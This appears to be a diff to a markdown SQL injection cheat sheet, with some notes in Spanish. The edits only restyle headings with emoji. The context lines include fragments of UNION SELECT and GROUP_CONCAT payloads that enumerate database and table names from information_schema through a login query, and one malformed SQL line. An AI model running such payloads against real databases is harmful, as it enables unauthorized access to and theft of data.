@@ -1,8 +1,8 @@
 # SQLi: schema, schemata & DIOS
 
-## Basics: `information schema`
+## 💀 Basics: `information schema`
 
-### Query basic
+### 💉 Query basic
 
 ````sql
 ## Schema Name AKA Databases Names Dump
@@ -11,7 +11,7 @@ select schema_name CONCAT information_schema.schemata;
 
 ---
 
-### Group Concat
+### 💉 Group Concat
 
 #### Basic
 
@@ -35,7 +35,7 @@ SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.sche
 
 ---
 
-### Concat
+### 💉 Concat
 
 #### Basic
 
@@ -64,9 +64,9 @@ SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemat
 
 <br>
 
-## Query Basics: `Union` + `Group Concat`
+## 💀 Query Basics: `Union` + `Group Concat`
 
-#### `Union Select` Progression:
+### `Union Select` Progression:
 
 ````sql
 ## Original example v1:
@@ -95,9 +95,9 @@ select username,password from users where username = 'F0n3' union select 'izquie
 
 <br>
 
-## `schema_name`: Databases Names Enum
+## 💀 `schema_name`: Databases Names Enum
 
-#### `Union Select` + `schema_name`
+### 💉 `Union Select` + `schema_name`
 
 - `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.
 
@@ -123,7 +123,7 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schem
 
 ---
 
-#### `Group Concat` + `Union Select` + `schema_name`
+### 💉 `Group Concat` + `Union Select` + `schema_name`
 
 - `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)
 
@@ -147,9 +147,9 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP
 
 <br>
 
-## `table_name`: Tables Names Enum
+## 💀 `table_name`: Tables Names Enum
 
-#### `Union Select` + `schema_name`
+### 💉 `Union Select` + `schema_name`
 
 - `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.
 
@@ -179,7 +179,7 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table
 
 ---
 
-#### `Group Concat` + `Union Select` + `schema_name`
+### 💉 `Group Concat` + `Union Select` + `schema_name`
 
 - `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)
 
